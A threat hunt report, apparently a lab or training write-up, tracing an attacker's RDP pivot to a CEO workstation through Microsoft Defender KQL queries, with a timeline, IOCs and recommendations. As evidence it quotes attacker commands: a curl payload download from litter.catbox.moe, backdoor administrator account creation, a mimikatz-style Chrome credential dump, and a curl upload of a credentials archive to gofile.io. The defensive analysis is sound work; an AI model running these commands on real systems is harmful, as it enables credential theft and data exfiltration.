## Threat Hunt Report
**Bridge Takeover – Executive Endpoint Compromise**

<img width="427" height="322" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/overview/Bridge%20Takeover.png" />

**Azuki Import/Export**

**Executive Summary**

Five days after the initial file server breach, threat actors re-entered the environment using previously established access. The attacker laterally moved from a compromised workstation to the CEO’s administrative workstation, leveraging RDP and valid credentials. Once established, the attacker deployed a Meterpreter backdoor, escalated privileges, enumerated sensitive credential stores, and staged high-value business data. The incident culminated in the exfiltration of financial documents and password databases to multiple anonymous file-hosting services.

| Category                | Details                                               |
| ----------------------- | ----------------------------------------------------- |
| **Incident Type**       | Lateral Movement, Credential Theft, Data Exfiltration |
| **Initial Detection**   | Nov 24, 2025                                          |
| **Threat Actor Access** | RemoteInteractive (RDP)                               |
| **Security Platform**   | Microsoft Defender for Endpoint                       |
| **Confidence Level**    | High                                                  |

| Attribute                        | Value                               |
| -------------------------------- | ----------------------------------- |
| **Source IP (Lateral Movement)** | `10.1.0.204`                        |
| **Exfiltration Infrastructure**  | `litter.catbox.moe`, `gofile.io`    |
| **Tooling Observed**             | curl, 7zip, Meterpreter, PowerShell |
| **Framework Indicators**         | Metasploit                          |

| Asset Type               | Identifier                    |
| ------------------------ | ----------------------------- |
| **Workstation (Pivot)**  | `azuki-sl`                    |
| **File Server**          | `azuki-fileserver01`          |
| **CEO Admin PC**         | `azuki-adminpc`               |
| **Compromised Accounts** | `yuki.tanaka`, `yuki.tanaka2` |

| Tactic               | Technique                       | ID           |
| -------------------- | ------------------------------- | ------------ |
| Initial Access       | Valid Accounts                  | T1078        |
| Lateral Movement     | Remote Services (RDP)           | T1021.001    |
| Execution            | Command & Scripting Interpreter | T1059        |
| Persistence          | Registry Run Keys               | T1547.001    |
| Privilege Escalation | Account Manipulation            | T1098        |
| Credential Access    | OS Credential Dumping           | T1003        |
| Discovery            | Account & Network Discovery     | T1087, T1046 |
| Collection           | Archive Collected Data          | T1560        |
| Exfiltration         | Exfiltration Over Web Services  | T1567        |

**Investigation Timeline (Key Events)**
**Lateral Movement**
```
//Lateral_Movement
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
DeviceLogonEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where LogonType == "RemoteInteractive"
| where tolower(DeviceName) contains ("admin")
| project Timestamp, DeviceName, AccountName, ActionType, RemoteIP, RemotePort, LogonType, IsLocalAdmin
| order by Timestamp desc
```

**2025-11-24 14:17 UTC**
Successful RDP login to azuki-adminpc

Account: yuki.tanaka

Source IP: 10.1.0.204

<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/lateral-movement/Lateral_movement_azuki-adminpc1.png" />

**Malware Staging**
```
//Device_Staging_area_search
let Start = datetime(2025-11-24);
let End   = datetime(2025-11-30);
let AdminPC = "azuki-adminpc";
let SourceIP = "10.1.0.204";
let WindowAfterLogon = 45m;
let RdpLogons =
DeviceLogonEvents
| where Timestamp between (Start .. End)
| where tolower(DeviceName) == tolower(AdminPC)
| where LogonType == "RemoteInteractive"
| where RemoteIP == SourceIP
| project DeviceId, LogonTime = Timestamp;
RdpLogons
| join kind=inner (
    DeviceNetworkEvents
    | where Timestamp between (Start .. End)
    | where ActionType == "ConnectionSuccess"
    | where RemoteIPType == "Public" 
    | extend Domain = tolower(tostring(parse_url(RemoteUrl).Host))
    ) on DeviceId
| where Timestamp  between (LogonTime .. LogonTime + WindowAfterLogon)
```
**2025-11-25 04:06 UTC**
Malware downloaded via anonymous file host:

```
curl.exe -L -o KB5044273-x64.7z https://litter.catbox.moe/gfdb9v.7z
```
<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/External_archive_download.png" />

**Payload Extraction**
```
//Likely_Extraction_Activity
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-adminpc"
| extend cmd = tolower(ProcessCommandLine), proc = tolower(FileName)
| where proc in ("7z.exe","7za.exe","winrar.exe","rar.exe",
  "tar.exe","expand.exe","powershell.exe","pwsh.exe",
  "certutil.exe","cmd.exe")
| where cmd has_any (" -p", " -P", "pass", "password", "pwd", "key", "secret")
| where cmd has_any ("7z", "7z.exe", " x ", " e ", "extract", "unpack", "expand", "tar -x", "expand.exe") or cmd matches regex @"\b(7z|7za|winrar|rar|tar|expand)\b.*\b(x|e|extract|unpack|xf)\b"

```
**2025-11-25 04:21 UTC**: A command used to extract the password-protected archive:

```
7z.exe x KB5044273-x64.7z -p******** -oC:\Windows\Temp\cache -y
```
<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Extraction_of_password_protected_archive.png" />

* Meterpreter payload deployed

**Command & Control**
```
//Persistence_named_pipes
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
DeviceEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-adminpc"
| where InitiatingProcessAccountName == "yuki.tanaka"
| where ActionType == "NamedPipeEvent"
| where InitiatingProcessCommandLine contains "meterpreter"//since a meterpreter.exe file was created to enable remote access.
```
* **Named Pipe Identified**
```
\Device\NamedPipe\msf-pipe-5902
```
<img width="750" height="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Named_pipe_msf.png" />

* Confirms Metasploit usage

**Privilege Escalation**
```
//Privilege_escalation_account_creation
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-adminpc"
| where AccountName == "yuki.tanaka"
| where ProcessCommandLine has_any ("powershell", "base64", "ps1", "7z", "rar", "encode")
| order by Timestamp desc 
```
* **Backdoor Account Created and added to the administrators group**
```
net user yuki.tanaka2 B@ckd00r2024! /add
net localgroup Administrators yuki.tanaka2 /add
```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Privilege_escalation_administrators_group1.png" />

**Cyber Chef decoded base64 commands**
* New account added

  <img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Base64_decoded_privilege_escalation_command.png" />
  
* Account added to the administrators group (privilege escalation)
  
 <img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Cyber_Chef_decoded_command.png" /> 

**Domain Trust Enumeration**
```
//Domain_Trust_enumeration
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-adminpc"
| where AccountName == "yuki.tanaka"
| where ProcessCommandLine has_any ("Domain", "trusts", "dig", "nltest", "dsquery", "NetDomainTrust", "ADTrust")
| order by Timestamp desc
```
Timestamp **2025-11-25T04:09:25.4429368Z**: Initial command used to enumerate domain trusts.
Command:
```
"nltest.exe" /domain_trusts /all_trusts
```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Domain_trust_enumeration.png" />


**Network Connections Enumeration**
```
//Network_Connections_Enumeration
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-adminpc"
| where AccountName == "yuki.tanaka"
| where ProcessCommandLine has_any ("netstat", "who", "ipconfig", "show ip sockets")
| order by Timestamp desc 
```
Timestamp **2025-11-25T04:10:07.805432Z**: “**netstat.exe -ano**” command was executed to enumerate connections on the network.

<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Network_connection_enumeration.png" />

**Credential & Data Discovery**
```
//Credential_enumeration
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
let TargetDevice = "azuki-adminpc";
let PwDbTerms = dynamic([ "keepass", "kdbx", "kdb", "password safe", "pwsafe", "psafe", "pws",
  "bitwarden", "vault", "vaults", "enpass", "1password", "lastpass", "dashlane",
  "logins", "passwords", "creds", "credential", "secrets"
]); 
let SearchTools = dynamic(["cmd.exe","powershell.exe","pwsh.exe",
  "where.exe","findstr.exe","dir.exe",
  "robocopy.exe","xcopy.exe",
  "es.exe",                 // Everything CLI (if present)
  "explorer.exe"
]);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where tolower(DeviceName) == tolower(TargetDevice)
| where AccountName == "yuki.tanaka"
| extend cmd = tolower(ProcessCommandLine), proc = tolower(FileName)
// Search-like behavior
| where proc in~ (SearchTools)
| where cmd has_any ("dir ", " where ", "where.exe", "findstr", "select-string", "get-childitem", "gci ", "ls ", "tree ", " /s", " /b")
// Password DB / vault keywords or extensions in the command itself
| where cmd has_any (PwDbTerms)
   or cmd matches regex @"\.(kdbx|kdb|pws|psafe3|opvault|agilekeychain|sqlite|db|csv|json)\b"
| project
    Timestamp,
    DeviceName,
    AccountName,
    FileName,
    ProcessCommandLine,
    InitiatingProcessFileName,
    InitiatingProcessCommandLine,
    IsProcessRemoteSession,
    ProcessRemoteSessionIP,
    ProcessRemoteSessionDeviceName
| order by Timestamp desc
```

KeePass enumeration:
```
cmd.exe /c where /r C:\Users *.kdbx
```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Credential_enumeration_kdbx.png" />

* Sensitive files accessed:

  * OLD-Password.txt

```
//Credential_File_Discovery
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
let TargetDevice = "azuki-adminpc";
let User = "yuki.tanaka";
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where tolower(DeviceName) == tolower(TargetDevice)
| where ProcessCommandLine has_any (@"\Users\", @"\Desktop\", @"\Documents\")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp desc

```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/credential-theft/OLD_Password_text.png" />

  * Banking records

<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Banking_documents_copied.png" />

**Browser Credential Theft**
```
//Browser_Credential_Theft
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
let TargetDevice = "azuki-adminpc";
let User = "yuki.tanaka";
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where tolower(DeviceName) == tolower(TargetDevice)
| where ProcessCommandLine has_any ("cookies", "session", "explorer.exe", "select", "login", "password", "browser", "stores")
| order by Timestamp desc
```
Timestamp **2025-11-25T05:55:54.858525Z**: Credentials were stolen from the browser:

Command:
```
"m.exe" privilege::debug "dpapi::chrome /in:%localappdata%\Google\Chrome\User Data\Default\Login Data /unprotect" exit
```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/more-evidence/Browser_credential_theft.png" />

**Data Staging**

* Staging directory:
  
 ``` 
C:\ProgramData\Microsoft\Crypto\staging
```

<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/staging/Staging_directory_path.png" />

* Data copied:

```
robocopy Documents\Banking staging\Banking /E
```


**Compression & Exfiltration**

Archive created:

```
tar.exe -czf credentials.tar.gz Azuki-Passwords.kdbx KeePass-Master-Password.txt
```

<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/credential-theft/Master_password_extracted.png" />

* Exfiltration:
```
//Exfiltration_of_Archives
let PostIncidentStart = datetime(2025-11-24);
let PostIncidentEnd   = datetime(2025-11-30);
DeviceProcessEvents
| where Timestamp between (PostIncidentStart .. PostIncidentEnd)
| where DeviceName == "azuki-adminpc"
| where AccountName == "yuki.tanaka"
| where ProcessCommandLine has_any ("HTTPS", "POST", "upload", "curl", "xcopy")
| project Timestamp, ActionType, FileName, ProcessCommandLine, FolderPath, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionDeviceName
| order by Timestamp desc
```
Timestamp **2025-11-25T04:41:51.7723427Z**: The first archive was exfiltrated.

Command:
```
curl.exe -X POST -F file=@credentials.tar.gz https://store1.gofile.io/uploadFile
```
<img width="750" hieght="450" alt="image" src="https://github.com/andrepoyser980/Cargo-Hold-Bridge-Takeover/blob/main/images/exfiltration/gofile-exfill.png" />

* **Destination IP**: 45.112.123.227

**Impact Assessment**
**Actual Impact**

* Theft of password databases

* Exposure of banking & financial records

* Persistent administrative backdoor

* CEO workstation fully compromised

**Risk Level**

**CRITICAL**

**Key Indicators of Compromise (IOCs)**
**File Artifacts**

* `meterpreter.exe`

* `KB5044273-x64.7z`

* `credentials.tar.gz`

* `KeePass-Master-Password.txt`

* **Network**

* `litter.catbox.moe`

* `store1.gofile.io`

* `45.112.123.227`

**Registry**
```
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

**Recommendations**
**Immediate**

* Disable compromised accounts

* Isolate affected hosts

* Rotate all privileged credentials

* Block exfiltration domains

* Remove persistence mechanisms

**Long-Term**

* Enforce MFA on all RDP access

* Disable PowerShell encoded commands

* Implement EDR tamper protection

* Network segmentation for admin assets

* Continuous threat hunting cadence

**Appendix**

* All findings derived from Microsoft Defender for Endpoint telemetry

* Queries written in KQL

* Analysis performed using adversary emulation mindset
